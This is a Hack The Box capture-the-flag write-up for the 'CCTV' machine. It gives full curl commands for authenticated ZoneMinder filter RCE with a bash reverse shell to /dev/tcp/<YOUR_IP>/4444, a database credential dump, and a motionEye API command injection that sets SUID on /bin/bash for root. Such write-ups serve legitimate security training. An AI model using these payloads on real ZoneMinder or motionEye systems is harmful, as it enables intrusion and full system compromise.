<div align="center">

# CCTV — HackTheBox

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)

<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">

**MrsNobody**

[![HTB](https://img.shields.io/badge/HackTheBox-Profile-green?style=flat&logo=hackthebox)](https://app.hackthebox.com)

---

</div>

> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.

## Target Information

| Property | Value |
|----------|-------|
| Machine | CCTV |
| IP | `<TARGET_IP>` |
| OS | Linux |
| Difficulty | Medium |
| Hostname | cctv.htb |

## Table of Contents

1. [Initial Reconnaissance](#initial-reconnaissance)
2. [Web Exploitation — ZoneMinder](#web-exploitation--zoneminder)
3. [Lateral Movement — User: mark](#lateral-movement--user-mark)
4. [Privilege Escalation — Root](#privilege-escalation--root)
5. [Flags](#flags)
6. [Summary](#summary)

---

## Initial Reconnaissance

We begin with an Nmap scan to identify open ports and services.

```bash
nmap -sC -sV -oN nmap_cctv.txt <TARGET_IP>
```

<details>
<summary>Nmap Results</summary>

```
Port 22: SSH (OpenSSH 9.6p1)
Port 80: HTTP (Apache 2.4.58)
```

</details>

Navigating to the web server:

```
http://<TARGET_IP>/
```

Reveals a **ZoneMinder CCTV monitoring system** located at:

```
/zm
```

---

## Web Exploitation -- ZoneMinder

The web application is running:

```
ZoneMinder v1.37.63
```

This version is vulnerable to **Filter-based authenticated Remote Code Execution (RCE)**.

### Authentication and Session Priming

ZoneMinder enforces **CSRF protection**, so we must first authenticate and obtain a valid session cookie.

#### Capture Login Page CSRF Token

```bash
# Extract the CSRF token from the login page and store the session cookie
L_CSRF=$(curl -s -c cookies.txt --resolve cctv.htb:80:<TARGET_IP> \
"http://cctv.htb/zm/index.php?view=login" \
| grep -oP "__csrf_magic' value=\"\K[^\"]+")
```

#### Login Using Default Credentials

```bash
# Authenticate to ZoneMinder with default admin:admin credentials
curl -s -b cookies.txt -c cookies.txt --resolve cctv.htb:80:<TARGET_IP> \
-X POST "http://cctv.htb/zm/index.php" \
--data-urlencode "view=login" \
--data-urlencode "action=login" \
--data-urlencode "__csrf_magic=$L_CSRF" \
--data-urlencode "username=admin" \
--data-urlencode "password=admin"
```

### Capturing Filter CSRF Token

Once authenticated, we access the filter page to obtain a new CSRF token.

```bash
# Retrieve a fresh CSRF token from the filter view for the RCE payload
CSRF=$(curl -s -b cookies.txt --resolve cctv.htb:80:<TARGET_IP> \
"http://cctv.htb/zm/?view=filter" \
| grep -oP "__csrf_magic' value=\"\K[^\"]+")

echo "Captured CSRF: $CSRF"
```

### Executing the Reverse Shell

We inject a reverse shell through the **AutoExecuteCmd** parameter.

Start the listener:

```bash
nc -lvnp 4444
```

Trigger the RCE:

```bash
# Inject a reverse shell payload via the ZoneMinder filter AutoExecuteCmd parameter
curl -s -b cookies.txt --resolve cctv.htb:80:<TARGET_IP> -X POST \
"http://cctv.htb/zm/?view=filter&action=execute" \
--data-urlencode "__csrf_magic=$CSRF" \
--data-urlencode "filter[Name]=pwn" \
--data-urlencode "filter[Query][terms][0][attr]=Id" \
--data-urlencode "filter[Query][terms][0][op]=>=" \
--data-urlencode "filter[Query][terms][0][val]=0" \
--data-urlencode "filter[AutoExecute]=1" \
--data-urlencode "filter[AutoExecuteCmd]=bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'" \
--data-urlencode "filter[Background]=1"
```

A reverse shell connects back as:

```
www-data
```

---

## Lateral Movement -- User: mark

After gaining shell access, we enumerate the local database.

### Extract Database Credentials

```bash
cat /etc/zm/zm.conf | grep ZM_DB
```

### Dump the Users Table

```bash
mysql -u zmuser -pzmpass -D zm -e 'select Username,Password from Users;'
```

A password hash for user **mark** is discovered.

After cracking the hash:

```
Password: opensesame
```

### SSH Pivot

Using the recovered credentials:

```bash
ssh mark@<TARGET_IP>
```

```
Password: opensesame
```

---

## Privilege Escalation -- Root

While enumerating the system as **mark**, we discover a secondary home directory:

```
/home/sa_mark
```

Additionally, a **motionEye service** is running locally on:

```
Port 7999 — Control API
Port 8765 — Web Interface
```

### Vulnerability Analysis

The motion control API on **port 7999** is **unauthenticated**.

Inspecting the configuration:

```bash
/etc/motioneye/camera-1.conf
```

Shows that the service executes a script via the `on_event_start` parameter. This service runs as **root** to interact with camera drivers.

The `snapshot_filename` parameter is passed to a shell command without proper sanitization, allowing **command injection**.

### Exploitation

We inject a payload to set the **SUID bit on /bin/bash**.

#### Inject Payload

```bash
# Inject a command into snapshot_filename that sets the SUID bit on /bin/bash
python3 -c "import urllib.request; urllib.request.urlopen('http://127.0.0.1:7999/1/config/set?snapshot_filename=%24(chmod%20u%2bs%20/bin/bash)')"
```

#### Trigger Snapshot

```bash
# Trigger a snapshot to execute the injected command as root
python3 -c "import urllib.request; urllib.request.urlopen('http://127.0.0.1:7999/1/action/snapshot')"
```

### Verify SUID Bash

```bash
ls -l /bin/bash
```

Result:

```
-rwsr-xr-x
```

### Escalate to Root

```bash
/bin/bash -p
```

Root shell obtained.

---

## Flags

| Flag | Value |
|------|-------|
| User | `<REDACTED>` |
| Root | `<REDACTED>` |

---

## Summary

| Stage | Method |
|-------|--------|
| Reconnaissance | Nmap scanning |
| Initial Access | ZoneMinder Filter RCE |
| Lateral Movement | Database credential extraction |
| Pivot | SSH login as mark |
| Privilege Escalation | motionEye API command injection |

---

<div align="center">

**Written by MrsNobody**

<img src="../assets/MrsNobody.png" width="80">

*Hack The Box — CCTV*

</div>
